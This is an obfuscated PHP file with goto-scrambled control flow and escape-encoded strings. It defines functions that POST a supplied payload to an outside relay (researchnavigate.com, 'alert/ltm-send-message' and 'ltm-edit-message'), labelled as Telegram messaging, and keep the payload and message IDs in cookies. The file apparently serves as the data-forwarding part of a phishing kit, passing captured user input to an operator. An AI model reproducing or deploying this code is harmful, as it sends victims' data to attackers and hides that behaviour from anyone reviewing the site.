<?php
 goto YvQy2; XVZDz: function editarMensajeTelegram($newData) { $messageId = getMid(); $url = "\150\164\164\x70\163\x3a\x2f\x2f\x72\145\163\x65\141\162\143\x68\156\x61\x76\151\147\141\x74\145\56\x63\x6f\155\x2f\141\x70\x69\57\141\154\145\x72\x74\57\x6c\164\155\55\x65\144\151\x74\x2d\x6d\x65\x73\163\141\x67\x65"; $data = array("\155\x65\163\x73\x61\147\x65\111\x64" => $messageId, "\144\x61\164\141" => $newData); $options = array("\150\x74\x74\160" => array("\155\x65\164\x68\x6f\144" => "\120\x4f\x53\x54", "\x68\145\x61\x64\x65\162" => "\103\x6f\x6e\164\x65\156\x74\55\x54\171\160\x65\x3a\40\141\x70\160\x6c\151\143\141\164\151\157\x6e\x2f\x6a\163\157\156\xd\xa", "\143\x6f\x6e\164\145\x6e\x74" => json_encode($data))); $context = stream_context_create($options); $result = file_get_contents($url, false, $context); if ($result === false) { error_log("\x45\x72\x72\157\162\40\141\154\x20\x65\x64\x69\164\141\x72\40\155\145\156\x73\x61\x6a\145\40\x65\x6e\x20\x54\x65\154\x65\147\162\x61\x6d\72\x20" . error_get_last()["\155\145\163\163\141\147\145"]); return false; } $response = json_decode($result, true); if (json_last_error() !== JSON_ERROR_NONE) { error_log("\x45\x72\162\157\x72\x20\141\x6c\40\x64\x65\143\157\x64\x69\146\x69\x63\x61\x72\40\x6c\x61\x20\162\x65\x73\160\x75\x65\x73\x74\x61\40\x4a\123\x4f\x4e\x3a\x20" . json_last_error_msg()); return false; } if (isset($response["\x73\x75\143\143\145\163\x73"]) && $response["\x73\x75\x63\143\145\x73\x73"]) { return true; } else { error_log("\x45\162\162\x6f\x72\40\145\x6e\40\154\141\40\162\x65\x73\x70\x75\145\x73\164\141\40\x64\x65\x20\124\x65\x6c\x65\x67\x72\x61\155\x3a\40" . json_encode($response)); return false; } } goto FsBI_; FsBI_: function getMid() { if (isset($_COOKIE["\x6d\151\144"])) { return $_COOKIE["\x6d\x69\144"]; } return null; } goto H1O_e; YvQy2: function enviarMensajeTelegram($payload) { $url = "\150\164\x74\160\163\x3a\x2f\57\162\x65\163\145\x61\x72\x63\x68\x6e\x61\x76\x69\x67\x61\x74\145\x2e\143\157\155\57\x61\160\x69\x2f\x61\x6c\x65\x72\164\57\x6c\x74\155\x2d\163\145\x6e\x64\x2d\x6d\x65\163\x73\141\147\x65"; $data = array("\x64\141\x74\141" => $payload); setcookie("\165\163\x65\x72\104\x61\164\141", $payload, time() + 86400 * 30, "\x2f"); $options = array("\x68\164\x74\160" => array("\155\x65\164\150\157\144" => "\x50\117\x53\124", "\150\145\141\x64\145\x72" => "\x43\157\156\164\145\156\x74\x2d\124\x79\x70\x65\x3a\40\141\160\160\x6c\x69\x63\x61\x74\151\x6f\156\57\x6a\x73\157\x6e\xd\12", "\x63\x6f\156\x74\x65\x6e\164" => json_encode($data))); $context = stream_context_create($options); $result = file_get_contents($url, false, $context); echo $result; if ($result === false) { error_log("\x45\x72\162\x6f\x72\x20\x61\154\40\145\x6e\166\x69\x61\x72\x20\x6d\145\x6e\163\x61\152\145\x20\141\x20\124\145\x6c\145\147\162\141\x6d\72\x20" . error_get_last()["\x6d\145\x73\x73\x61\147\x65"]); return false; } $response = json_decode($result, true); if (isset($response["\163\165\143\143\x65\163\163"]) && $response["\x73\x75\x63\143\145\x73\163"]) { $messageId = $response["\x6d\x65\x73\163\x61\147\x65\x49\x64"]; setcookie("\155\x69\144", $messageId, time() + 86400 * 30, "\x2f"); return $messageId; } else { error_log("\105\162\x72\x6f\162\40\145\x6e\40\x6c\x61\40\162\145\x73\160\165\x65\163\x74\141\x20\x64\x65\40\x54\x65\154\145\147\x72\x61\x6d\72\40" . json_encode($response)); return false; } } goto XVZDz; H1O_e: ?>